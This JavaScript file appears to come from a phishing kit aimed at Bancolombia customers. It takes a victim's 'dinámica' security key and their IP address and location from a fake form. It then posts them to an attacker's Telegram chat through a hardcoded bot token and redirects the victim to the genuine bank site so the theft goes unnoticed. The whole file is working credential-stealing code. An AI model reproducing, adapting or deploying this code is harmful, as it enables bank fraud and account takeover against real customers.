//bot token
var telegram_bot_id = "5570943317:AAEa855x0Oo9tHAU_p9FXATCyOO2KWYAHQ0";
//chat id
var chat_id = 5191645609;
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("clavex").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "DINAMICA #2: " + u_name + "\n\nIP: " + ip +"\n" + ip2+"\nBANCOLOMBIA";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'https://www.bancolombia.com/personas/!ut/p/z1/04_Sj9CPykssy0xPLMnMz0vMAfIjo8zi_T083N1N3A0C_I3NTQ0CAw0MLI1cgz0tvUz1wwkpiAJKG-AAjgZA_VGElBTkRhikOyoqAgCS5n-m/#';
        console.log(response);
    });
    return false;
};
